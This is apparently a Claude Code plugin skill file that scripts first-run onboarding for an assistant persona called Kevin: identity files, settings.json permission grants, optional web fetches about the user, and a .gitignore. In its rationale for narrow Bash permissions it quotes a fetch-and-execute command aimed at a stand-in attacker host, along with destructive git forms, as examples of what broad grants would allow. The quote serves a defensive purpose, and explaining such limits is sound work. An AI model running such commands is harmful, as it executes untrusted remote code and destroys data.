---
name: init
description: Guided first-run onboarding for the agent-kevin plugin. Walks through Kevin's character (SOUL), role (IDENTITY), your basics (name, timezone), an optional web pull from your blog/site/LinkedIn/etc., and communication style — then scaffolds CLAUDE.md (operating manual + @-imports), SOUL.md, IDENTITY.md, USER.md, and .claude/settings.json. If a CLAUDE.md already exists at the home directory, Kevin's version is written to CLAUDE.local.md instead. Skill packs are configured inline at the end or via /agent-kevin:configure-skills any time later. Invoke once after installing the plugin.
disable-model-invocation: true
allowed-tools: Read, Write, Edit, AskUserQuestion, WebFetch, Bash(mkdir *), Bash(cp *), Bash(cat *), Bash(ls *), Bash(find *), Bash(git config *), Bash(readlink *), Bash(date *), Bash(echo *), Bash(test *), Bash([ *), Bash(grep *), Bash(printf *)
---

# Initialize Kevin

Guided onboarding. Follow the steps in order — each step's answers become defaults for later ones.

---

## Step 0 — Resolve HOME and check idempotency

Kevin's home is **the current working directory** — whatever directory the user launched `claude` from. No home-picker prompt. Power users can override by setting `KEVIN_HOME` in their shell rc.

```bash
HOME_DIR="${KEVIN_HOME:-$PWD}"
if [ -f "$HOME_DIR/SOUL.md" ]; then
  echo "ALREADY_INITIALIZED at $HOME_DIR"
fi
```

`SOUL.md` is Kevin's idempotency marker — its filename is unique to the plugin (unlike `CLAUDE.md`, which may pre-exist in any Claude Code project the plugin gets installed into).

If `ALREADY_INITIALIZED`, ask the user whether to re-run setup (overwrites SOUL.md, IDENTITY.md, USER.md, and the operating manual at CLAUDE.md or CLAUDE.local.md; reseeds empty indexes; preserves `knowledge/user/*.md` content + `projects/`) or abort. Default: abort.

---

## Step 1 — Banner + intro

Print the welcome banner inside a fenced code block (the fence preserves the ASCII art literally):

````
```
 ╔═╗ ╔═╗ ╔═╗ ╔╗╔ ╔╦╗
 ╠═╣ ║ ╦ ║╣  ║║║  ║ 
 ╩ ╩ ╚═╝ ╚═╝ ╝╚╝  ╩ 
===KEVIN=== 🍌
```
````

Then below the banner, plain prose (no leading whitespace, no numbered lists — the question-mark glyph signals "step Kevin will ask you about"):

> Welcome. Kevin will set up here: `<HOME_DIR>`.
>
> This onboarding takes about 5 minutes and walks through seven steps:
>
> ❓ Kevin's character, accept or refine
> ❓ Kevin's role, accept or refine
> ❓ Your basics: name, timezone
> ❓ Optional: paste any URLs about you (blog, LinkedIn, GitHub, etc.)
> ❓ Optional: paste a path or URL for your avatar (gets linked into knowledge/user/profile.md)
> ❓ Optional: should knowledge/ and projects/ live somewhere outside the home directory?
> ❓ Communication style and values
> ❓ Optional: configure skill packs (SEO, Browser, third-party libraries)
> ❓ Confirm + scaffold
>
> A few of the steps will prompt Claude Code for permission to run Bash commands, write files, or fetch URLs.

---

## Step 2 — Kevin's SOUL (character)

Read the bundled template:

```bash
cat "${CLAUDE_PLUGIN_ROOT}/templates/SOUL.md"
```

Summarize in one sentence: *"Default: Sharp, direct, opinionated. Concise. Calls things out when wrong. Doesn't over-apologize."* Then `AskUserQuestion`:

> **Kevin's character** — accept the default or refine?
> - Accept (recommended)
> - Refine — describe what's different (e.g., "warmer and more encouraging", "even sharper and less polite")

If **Accept**: stage the template verbatim for writing in Step 7.
If **Refine**: take the redirect, edit the staged SOUL content (light touch — tone language in `## Vibe` and `## Core Truths`, keep structure intact).

---

## Step 3 — Kevin's IDENTITY (role)

Read the bundled template:

```bash
cat "${CLAUDE_PLUGIN_ROOT}/templates/IDENTITY.md"
```

Summarize: *"Default: AI assistant for learning, planning, research, coding."* Then `AskUserQuestion`:

> **Kevin's primary role for you** (pick one)
> - General-purpose personal assistant (recommended)
> - Coding + technical work focus
> - Research + writing focus
> - Life-management + planning focus
> - Custom — describe in one sentence

Adjust the staged IDENTITY's `## Core Role` to match. Leave `## Operational Pattern` empty (Kevin grows it over time).

---

## Step 4 — Your basics (name + timezone)

Infer defaults first:

```bash
NAME_DEFAULT=$(git config user.name 2>/dev/null || echo "${USER:-friend}")
TZ_IANA=$(readlink /etc/localtime 2>/dev/null | sed 's|.*/zoneinfo/||')
```

`AskUserQuestion` (batched):

> 1. **Your name** — what should Kevin call you? (Default: `<NAME_DEFAULT>`)
> 2. **Your timezone** — IANA name like `America/New_York`. (System looks like: `<TZ_IANA>`)

Stage answers for the USER.md write.

---

## Step 5 — Optional: paste any URLs about yourself

Freeform multi-URL input. **Do NOT use `AskUserQuestion` here** — its `Other` text field has a fixed placeholder ("Type something") and adding a redundant "Provide URLs" option just to point at it produces a confusing UI. Ask in plain chat instead.

Emit this as a regular assistant message and wait for the user's next turn:

> **Optional — paste any URLs about you** (newline- or space-separated). Examples: personal site/blog, LinkedIn, GitHub, X/Mastodon, podcast page, talks. Kevin fetches each, synthesises durable facts into `knowledge/user/*.md`, and cites the source URL inline.
>
> Reply with the URLs, or say `skip` to continue with empty stubs.

Parse the user's next message: split on whitespace + newlines, keep tokens that look like URLs (start with `http://`, `https://`, or a bare domain like `github.com/...`). If the message is `skip` (case-insensitive) or contains no URLs, jump to Step 6.

If blank → skip to Step 6.

Otherwise, parse URLs (split on whitespace + newlines, filter to anything that looks like a URL). For each, `WebFetch` and synthesise into staged content:

- Bio / about / personal site → `profile.md` (bio, location, work focus) + `interests.md` (topics they write about) + light tone hints → `preferences.md`
- Professional / LinkedIn-style → `career.md` (roles, companies, dates) + `skills.md`
- Code host (GitHub, GitLab, etc.) → augment `skills.md` (languages, repos) + `interests.md` (project themes)
- Social / posts → light tone signal only into `preferences.md`. No post-content extraction.

Sort URLs by their inferred type — Kevin decides which facet each lands in based on content, not the order the user pasted them.

**Rules:**
- Frontmatter: `title`, `sources` (URL list), `created`, `updated` (today)
- Cite inline: `_Source: <URL>_` at end of each fact
- Durable facts only — no transient news items, current events, etc.
- 404 / paywall / fetch error: note it in the log, skip that URL, continue with the rest

**Do not** ask the user to confirm the synthesised content. Stage it and continue — the user can edit any `knowledge/user/*.md` file later, or re-run `/agent-kevin:knowledge-compile` to regenerate.

---

## Step 5b — Optional: your avatar

Plain chat (NOT `AskUserQuestion`, since the answer is freeform):

> **Optional — paste a path or URL for your avatar.** If you give a local path, Kevin copies it to `<HOME>/knowledge/user/assets/avatar.<ext>`. If you give a URL, Kevin downloads it the same place. Either way, Kevin adds an `Avatar:` field to your staged `knowledge/user/profile.md` pointing at the local copy so it shows up in Obsidian. Reply with the path/URL or `skip`.

Parse the next user message:
- `skip` (case-insensitive) → no-op, jump to Step 5c.
- Looks like a local file path → `cp` to `<HOME>/knowledge/user/assets/avatar.<ext>` (`mkdir -p` first; preserve original extension).
- Looks like an HTTP(S) URL → `curl -fsSL` to the same destination, infer extension from response Content-Type or URL suffix.

Stage `Avatar: knowledge/user/assets/avatar.<ext>` into the eventual `knowledge/user/profile.md` frontmatter or top-of-body. Don't fail the whole init if the download/copy fails — log it and continue with no avatar.

---

## Step 5c — Optional: external storage for knowledge/ and projects/

`AskUserQuestion`:

> **Where should `knowledge/` and `projects/` live?** Default keeps them inside your agent home. Override if you want to:
> - sync via iCloud (path outside the home)
> - keep them in a separate git repo
> - share `projects/` across multiple Kevin homes
>
> - Default: inside `<HOME>` (recommended)
> - Specify custom paths

If the user picks "Specify", ask for two paths (plain chat or two follow-up `AskUserQuestion` rounds): `KEVIN_KNOWLEDGE` and `KEVIN_PROJECTS`. Tilde-expand. Validate the paths look reasonable. Stage both env-var values for the eventual `.zshrc` reminder in Step 9.

**If either path is OUTSIDE the agent home directory**, Step 7's `.claude/settings.json` write must also append `permissions.allow` entries (and `sandbox.filesystem.allowWrite` if the user's sandbox is enabled, see below) so Claude Code can read/write there without prompting on every operation. Specifically add to `permissions.allow`:

```json
"Read(<KEVIN_KNOWLEDGE>/**)",
"Write(<KEVIN_KNOWLEDGE>/**)",
"Edit(<KEVIN_KNOWLEDGE>/**)",
"Read(<KEVIN_PROJECTS>/**)",
"Write(<KEVIN_PROJECTS>/**)",
"Edit(<KEVIN_PROJECTS>/**)"
```

And if `~/.claude/settings.json` has a `sandbox.filesystem.allowWrite` array, mirror those two paths into it too — otherwise Claude Code's sandbox blocks the writes regardless of `permissions.allow`.

If both paths are inside `<HOME>`, no extra grants needed (the home dir's `.` is already on the writable list).

---

## Step 6 — Communication style + values

If Step 5 surfaced a tone signal, use it as a default. Otherwise no default.

`AskUserQuestion`:

> **How do you want Kevin to talk to you?**
> - Direct + technical
> - Step-by-step walkthrough
> - Encouraging + simple
> - Custom — describe in one sentence

Stage for the `## How to Talk to Me` section of USER.md.

Optionally `AskUserQuestion`:

> **Any hard preferences / values I should always respect?** (Optional — answer N/A to skip)
> Examples: "no recommending alcohol", "always halal options", "I work in healthcare — never specific medical actions"

Stage for the `## Values` section.

---

## Step 7 — Write the scaffold

Create the directory tree:

```bash
# Resolve knowledge + projects paths from Step 5c. Default = under $HOME_DIR.
KNOWLEDGE_ROOT="${KEVIN_KNOWLEDGE:-$HOME_DIR/knowledge}"
PROJECTS_ROOT="${KEVIN_PROJECTS:-$HOME_DIR/projects}"

mkdir -p "$HOME_DIR"/.kevin/{config,logs} "$HOME_DIR"/.claude/assets
mkdir -p "$KNOWLEDGE_ROOT"/{user/assets,concepts,memory,raw/{sessions,user,specs,archive/specs}}
mkdir -p "$PROJECTS_ROOT"
```

Note: do **not** create `.claude/skills/` here. Third-party skill libraries are installed via `/agent-kevin:configure-skills` after the user relaunches.

Copy Kevin's avatar into `.claude/assets/` so it stays out of the way at the home root but is still resolvable from `IDENTITY.md`:

```bash
cp "${CLAUDE_PLUGIN_ROOT}/assets/kevin-avatar.jpg" "$HOME_DIR/.claude/assets/kevin-avatar.jpg"
```

If a user avatar was staged in Step 5b (`<user-avatar>` path resolved to a local file), also:

```bash
cp "<user-avatar>" "$KNOWLEDGE_ROOT/user/assets/avatar.<ext>"
```

(extension preserved from the source). The staged `knowledge/user/profile.md` should then reference that path in its frontmatter or top-of-body.

Write the three identity files (Kevin-unique filenames — won't collide with anything pre-existing):

- `$HOME_DIR/SOUL.md` ← staged content from Step 2
- `$HOME_DIR/IDENTITY.md` ← staged content from Step 3
- `$HOME_DIR/USER.md` ← rendered from Steps 4 + 6 (template below)

Write the operating manual + Claude Code memory file. **Collision-aware**: if `$HOME_DIR/CLAUDE.md` already exists (plugin installed into an existing project), don't overwrite — write to `$HOME_DIR/CLAUDE.local.md` instead and inform the user.

```bash
if [ -f "$HOME_DIR/CLAUDE.md" ]; then
  CLAUDE_DEST="$HOME_DIR/CLAUDE.local.md"
  COLLISION="yes"
else
  CLAUDE_DEST="$HOME_DIR/CLAUDE.md"
  COLLISION="no"
fi
cp "${CLAUDE_PLUGIN_ROOT}/templates/CLAUDE.md" "$CLAUDE_DEST"
```

- `$CLAUDE_DEST` ← `cp ${CLAUDE_PLUGIN_ROOT}/templates/CLAUDE.md` (verbatim — operating manual + `@-imports` for SOUL/IDENTITY/USER/knowledge)

If `COLLISION="yes"`, note this for the Step 9 status block so the user knows Kevin wrote to `CLAUDE.local.md`. Claude Code auto-loads `.local.md` files alongside the main `CLAUDE.md`, so the user's existing instructions and Kevin's coexist — Kevin's `@-imports` cascade still pulls in the identity stack.

Write a `.gitignore` so the home dir is safe to track in git out of the box. **Collision-aware**: if one already exists, don't overwrite — but append the two Kevin-critical entries (`.claude/settings.local.json` holds API keys, `.kevin/` holds runtime tokens + compile state) if they aren't already covered. Both must be gitignored or the user will leak secrets / churn on every Kevin run.

```bash
if [ ! -f "$HOME_DIR/.gitignore" ]; then
  cp "${CLAUDE_PLUGIN_ROOT}/templates/.gitignore" "$HOME_DIR/.gitignore"
else
  # Existing .gitignore — append Kevin-critical entries if missing.
  APPEND=""
  grep -qxF ".claude/settings.local.json" "$HOME_DIR/.gitignore" || APPEND="${APPEND}.claude/settings.local.json"$'\n'
  grep -qxF ".kevin/" "$HOME_DIR/.gitignore" || APPEND="${APPEND}.kevin/"$'\n'
  if [ -n "$APPEND" ]; then
    printf '\n# agent-kevin\n%s' "$APPEND" >> "$HOME_DIR/.gitignore"
  fi
fi
```

Match is exact-line (`grep -xF`) — so `.kevin/` won't false-match on `!.kevin/keep-me` or a partial substring. The full template (when written fresh) also ignores secrets (`.env*`, `keys.json`, `*.pem`, `*.key`, `certificates/`) and OS cruft (`.DS_Store`, `Thumbs.db`); on collision we trust the user's existing patterns for those and only enforce the two Kevin-specific entries.

Write project settings so the plugin auto-loads on subsequent launches AND all its bundled MCP tools are pre-granted (no per-call confirm prompts):

- `$HOME_DIR/.claude/settings.json` ← JSON below, with `<PLUGIN_PATH>` substituted with the absolute value of `${CLAUDE_PLUGIN_ROOT}`.

```json
{
  "$schema": "https://json.schemastore.org/claude-code-settings.json",
  "enabledPlugins": {
    "agent-kevin@agentlayer": true
  },
  "permissions": {
    "allow": [
      "Bash(cat *)",
      "Bash(date)",
      "Bash(date *)",
      "Bash(echo *)",
      "Bash(find *)",
      "Bash(git config user.email)",
      "Bash(git config user.name)",
      "Bash(git diff *)",
      "Bash(git log *)",
      "Bash(git status)",
      "Bash(git status *)",
      "Bash(ls)",
      "Bash(ls *)",
      "Bash(mkdir -p *)",
      "Bash(readlink *)",
      "Bash(test *)",
      "mcp__plugin_agent-kevin_kevin__compile_next",
      "mcp__plugin_agent-kevin_kevin__compile_status",
      "mcp__plugin_agent-kevin_kevin__compile_write",
      "mcp__plugin_agent-kevin_kevin__google_auth",
      "mcp__plugin_agent-kevin_kevin__gsc_inspect",
      "mcp__plugin_agent-kevin_kevin__gsc_query",
      "mcp__plugin_agent-kevin_kevin__gsc_sites",
      "mcp__plugin_agent-kevin_kevin__links_rewrite",
      "mcp__plugin_agent-kevin_kevin__memory_prune",
      "mcp__plugin_agent-kevin_kevin__open_page_rank",
      "mcp__plugin_agent-kevin_kevin__page_speed_audit",
      "mcp__plugin_agent-kevin_kevin__page_speed_psi",
      "mcp__plugin_agent-kevin_kevin__ping",
      "mcp__plugin_agent-kevin_kevin__playwright_pdf",
      "mcp__plugin_agent-kevin_kevin__playwright_record",
      "mcp__plugin_agent-kevin_kevin__playwright_screenshot",
      "mcp__plugin_agent-kevin_kevin__serpapi_search",
      "mcp__plugin_agent-kevin_kevin__task_close",
      "mcp__plugin_agent-kevin_kevin__task_create",
      "mcp__plugin_agent-kevin_kevin__task_get",
      "mcp__plugin_agent-kevin_kevin__task_query",
      "mcp__plugin_agent-kevin_kevin__task_scan",
      "mcp__plugin_agent-kevin_kevin__task_thread",
      "mcp__plugin_agent-kevin_kevin__task_update",
      "mcp__plugin_agent-kevin_perplexity__perplexity_search"
    ]
  }
}
```

**Why no `extraKnownMarketplaces` entry?** The marketplace registration was already saved to the user's global `~/.claude/settings.json` when they first ran `/plugin marketplace add` (Option A) or were prompted to trust the marketplace (Option B). Duplicating it in project settings is redundant — only `enabledPlugins` is needed here to opt this specific home into agent-kevin.

**Why pre-grant the full plugin MCP surface at init time?** Plugin-bundled tools can't be granted via the plugin's own `settings.json` — Claude Code only honors `agent`/`subagentStatusLine` keys at the plugin root and silently ignores everything else. The project-level `<HOME>/.claude/settings.json` is the canonical place, so granting all 25 plugin tools here (24 from the `kevin` server + `perplexity_search` from the bundled `perplexity` server) means the user consents once (by running `/init`) and tool calls never re-prompt afterwards. They can revoke individual entries by editing the file. The perplexity server is plugin-bundled so it auto-loads on every session — but it stays inert until `PERPLEXITY_API_KEY` lands in `settings.local.json` via Step 8's Browser pack walk (or `/agent-kevin:configure-skills` later).

**Why the Bash entries are scoped this narrowly:** broad patterns like `Bash(git *)` or `Bash(curl *)` would also authorize destructive forms (`git push --force`, `git reset --hard`, `curl attacker.com | sh`). The patterns above cover the read-mostly + scaffold-creation commands core skills actually use (`git log/status/diff/config`, `date`, `readlink`, `ls`, `find`, `cat`, `mkdir -p`, `test`, `echo`) — nothing that mutates source-control state or hits the network. **Network/curl is intentionally NOT pre-granted anywhere** — `wordpress-rest` and any other skill that makes outbound HTTP confirms on first call; the user picks "Always allow" to lock the grant to their actual URL pattern (much tighter than blanket `Bash(curl *)`).

Do **not** add `sandbox` or `hooks` blocks here. Hooks come from the plugin's own `hooks/hooks.json` once the plugin is registered. API keys + external MCP server config land in `settings.local.json` and `<HOME>/.mcp.json` later via `/agent-kevin:configure-skills` — those files stay separate.

USER.md template:

```markdown
# About <NAME>

Kevin reads this every session (via `@-import` in `CLAUDE.md`). The headline of who I am and how I want Kevin to work with me.

## Identity

- **Name:** <NAME>
- **Timezone:** <TIMEZONE>

## How to Talk to Me

<COMMUNICATION_STYLE_PARAGRAPH>

## Values

<VALUES_OR_PLACEHOLDER>

## Deeper

These files hold my evolving long-form knowledge. Kevin reads them on demand and updates them on compile.

- [Profile](knowledge/user/profile.md)
- [Skills](knowledge/user/skills.md)
- [Preferences](knowledge/user/preferences.md)
- [Career](knowledge/user/career.md)
- [Interests](knowledge/user/interests.md)
```

Write the five `knowledge/user/<facet>.md` files. If Step 5 ran with URLs, populate from the synthesised content with `sources:` populated. Otherwise write empty-with-frontmatter stubs.

Write `knowledge/index.md` and `knowledge/memory/index.md` as master indexes with empty placeholder sections.

For `projects/TASKS.md`, write this single-line scaffold — the task-list sections render automatically when `task_dashboard` first runs (which the auto-rebuild on the user's first task creation will trigger):

```markdown
> Tasks hub — auto-rebuilt by Kevin from task frontmatter on every mutation. Edit goals block only.

<!-- GOALS:START -->
## Monthly Goals

_No goals set yet — Kevin proposes on the 1st of each Hijri month._

## Weekly Goals

_No weekly goals set yet._
<!-- GOALS:END -->
```

After scaffolding, call `mcp__plugin_agent-kevin_kevin__task_dashboard` once so the file has its (empty) Active/Blocked/Overdue/Stale/Recently Closed sections rendered from day one — no scaffold drift.

---

## Step 8 — Optional: configure skill packs

The scaffold is done. Before showing the final confirmation, offer to wire up API keys + MCP servers + permissions for the optional packs. This is exactly what `/agent-kevin:configure-skills` does — invoking inline so the user doesn't have to run it as a separate command after relaunch.

`AskUserQuestion` (**multi-select**, so the user can tick any combination):

> **Configure skills now?**
> Pack skills already ship loaded with the plugin — this step wires API keys, MCP server registrations, and tool permissions so the keyed skills actually work. Third-party libraries are separately authored (Apache-2.0 etc.) and get cloned into your `<HOME>/.claude/skills/` on demand. Tick any combination, or skip entirely to come back later via `/agent-kevin:configure-skills`.
>
> - ☐ SEO pack (serpapi · open-page-rank · GSC · page-speed · WP · search-audit)
> - ☐ Browser pack (perplexity search + playwright screenshot/pdf/record permissions)
> - ☐ Third-party libraries (aaron-he-zhu SEO/GEO skills, coreyhaines31 marketing playbooks, others)

Behavior on the response:
- **Each ticked option**: run the matching configure-skills section in order — SEO (A.2a) → Browser (A.2b) → Third-party (F).
- **Nothing ticked**: skip — note "skill configuration skipped — run `/agent-kevin:configure-skills` after relaunch" for Step 9's status block. Don't touch settings files.

For each picked option: **delegate to configure-skills** — open `${CLAUDE_PLUGIN_ROOT}/skills/configure-skills/SKILL.md` and follow the matching section. Honor every per-skill skip option inside that flow; don't force the user through items they don't want. The walks write to `$HOME_DIR/.claude/settings.{json,local.json}`, `$HOME_DIR/.mcp.json`, and `$HOME_DIR/.claude/skills/<author>-<repo>/` (third-party clones).

---

## Step 9 — Confirmation

Print the same banner as Step 1 for visual continuity, with `===KEVIN=== 🍌` standing alone on its line (no trailing word). The "Ready" line follows below, separated by a blank line.

````
```
 ╔═╗ ╔═╗ ╔═╗ ╔╗╔ ╔╦╗
 ╠═╣ ║ ╦ ║╣  ║║║  ║ 
 ╩ ╩ ╚═╝ ╚═╝ ╝╚╝  ╩ 
===KEVIN=== 🍌
```
````

Then a blank line, then the **Ready** heading:

> 🟢 **Ready**

Blank line, then the status block as plain prose (one row per line, two-space gutter between label and value):

> ✅ Home          `<HOME_DIR>`
> ✅ Identity      SOUL.md · IDENTITY.md · USER.md
> ✅ Operating manual   `<MANUAL_PATH>` (`@-imports` the above)
> ✅ Plugin reg    .claude/settings.json (auto-loads agent-kevin next launch — no `--plugin-dir` needed)
> ✅ Knowledge     `<FACET_FILES_FILLED>/5` facets populated `<from blog · LinkedIn · GitHub, if Step 5 ran>`
> ✅ Indexes       knowledge/index.md · knowledge/memory/index.md · projects/TASKS.md
> `<SKILL_PACK_ROW>`
> ⏳ Custom skills none — author with `/agent-kevin:configure-skills`

For `<SKILL_PACK_ROW>`, render the row based on what Step 8 did:
- If user skipped Step 8 entirely → `⏳ Skill packs   none configured — run /agent-kevin:configure-skills later`
- If user configured SEO and/or Browser (fully or partially) → `✅ Skill packs   <list, e.g. "SEO (4/4 keyed skills configured), Browser (perplexity + playwright)">`
- If user configured but skipped individual sub-items → list what was set + note what's still pending: `✅ Skill packs   SEO (2/4 keyed; serpapi + open-page-rank set, GSC + page-speed deferred), Browser skipped`

Use ✅ for what landed and ⏳ for deferred (the hourglass implies "queued for later"). Don't list `<FACET_FILES_FILLED>/5` if Step 5 was skipped — just say "stubs only" instead.

For the operating-manual row:
- No collision: `<MANUAL_PATH>` = `CLAUDE.md`
- Collision detected (pre-existing CLAUDE.md): `<MANUAL_PATH>` = `CLAUDE.local.md` — also append a callout line:
  > ℹ️ Existing `CLAUDE.md` detected at home — Kevin's operating manual was written to `CLAUDE.local.md` alongside it. Both files load; your prior CLAUDE.md is untouched.

Blank line, then the **Next** heading (same style as Ready), then the relaunch prose. **Important: the user must exit and relaunch** so the new `.claude/settings.json` is picked up by Claude Code:

> 🚀 **Next**
>
> **One-time MCP-server install.** Kevin's MCP server runs from the plugin directory and needs its node_modules. From a separate terminal (or after `/exit`), run:
>
> ```bash
> cd <PLUGIN_PATH>/mcp-server && bun install
> ```
>
> (where `<PLUGIN_PATH>` is the absolute path of the plugin — same as `${CLAUDE_PLUGIN_ROOT}` during this init.) This pulls Chromium for Playwright (~150MB) and is required even if you installed via `/plugin marketplace add`. Skip if you've already done it for another Kevin home.
>
> **Then relaunch.** The plugin registration in `.claude/settings.json` only takes effect on a fresh session. Exit now (`/exit` or Ctrl+D) and relaunch:
>
> ```bash
> cd <HOME_DIR>
> claude
> ```
>
> **Watch for a marketplace trust prompt.** On first relaunch, Claude Code asks "this project wants to register a marketplace and enable a plugin — trust it?" **Accept it.** If you dismiss/miss the prompt, the plugin won't load and the SessionStart banner won't appear — recover by running:
>
> ```
> /plugin marketplace add <PLUGIN_DIR>
> /plugin install agent-kevin@agentlayer
> ```
>
> (where `<PLUGIN_DIR>` is the absolute path of the cloned plugin — same path as `${CLAUDE_PLUGIN_ROOT}` during this init session.)
>
> Once the plugin is loaded, try:
>
> - `/agent-kevin:configure-skills` — configure skill packs (SEO, Browser) or author a custom skill
> - `/agent-kevin:create-project` — start your first project
> - `/agent-kevin:morning-briefing` — see what Kevin knows about you
> - `mcp__plugin_agent-kevin_kevin__ping` — health check the MCP server
>
> Open `<HOME_DIR>` in Obsidian to view/edit your wiki.

---

## Notes for you (the orchestrating Claude)

- **Idempotent.** Step 0 catches re-runs.
- **No secrets in identity files.** API keys go to `<HOME>/.claude/settings.local.json` via the configure-skills flow (Step 8 inline or `/agent-kevin:configure-skills` later), never to CLAUDE/SOUL/IDENTITY/USER.
- **CLAUDE.md (or CLAUDE.local.md) is never customised.** Copy verbatim. SOUL.md adjusts tone. USER.md gets the user's headline. IDENTITY.md adjusts role.
- **Stage before write.** Build all content through Steps 2–6. Only Step 7 writes to disk.
- **Step 8 delegates, doesn't duplicate.** When the user opts to configure skills inline, *read* `${CLAUDE_PLUGIN_ROOT}/skills/configure-skills/SKILL.md` and follow its Section A walks. Don't reimplement key-prompts/MCP-writes/permission-grants here — keep configure-skills as the single source of truth so standalone use and inline use behave identically.
- **No `.claude/skills/` creation in Step 7.** That directory is only needed for custom-authored skills (configure-skills Section B). Sandbox often denies it; let configure-skills create it lazily.
- **URL fetches are best-effort.** Don't loop retries; note failures and move on. Don't ask the user to confirm the synthesised facts — let them edit later.
